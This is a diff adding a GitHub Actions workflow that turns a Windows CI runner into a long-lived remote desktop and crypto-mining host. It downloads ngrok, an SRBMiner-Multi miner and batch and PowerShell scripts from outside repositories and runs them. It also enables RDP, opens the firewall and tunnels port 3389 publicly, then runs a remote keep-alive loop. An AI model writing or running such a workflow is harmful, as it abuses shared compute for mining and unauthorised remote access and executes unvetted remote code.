@@ -1,0 +1,43 @@
+name: cobaserver
+on: workflow_dispatch
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+    timeout-minutes: 9999999
+    steps:
+
+    - name: Download ngrok
+      run: |
+        Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/ngrokstable.zip -OutFile ngrok.zip
+        Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/mine/srb/srbvendorax.bat -OutFile srbvendorax.bat
+        Invoke-WebRequest https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-win64.zip -OutFile srbminer.zip
+        
+
+    - name: Extract ngrok Files
+      run: Expand-Archive ngrok.zip
+    - name: Extract ngrok Files
+      run: Expand-Archive srbminer.zip
+
+    - name: Connecting ngrok Account
+      run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
+      env:
+        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
+
+    - name: Enable RDP Access
+      run: |
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+        
+    - name: Create Tunnel
+      run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp 3389"'
+      
+    - name: Connect to RDP  [CPU 2 Core - 7GB Ram - 256 SSD]
+      run: cmd /c start.bat
+    
+    - name: TimeCount
+      run: |
+        Invoke-WebRequest https://raw.githubusercontent.com/Palui2/aws/main/loop.ps1 -OutFile loop.ps1
+        ./loop.ps1
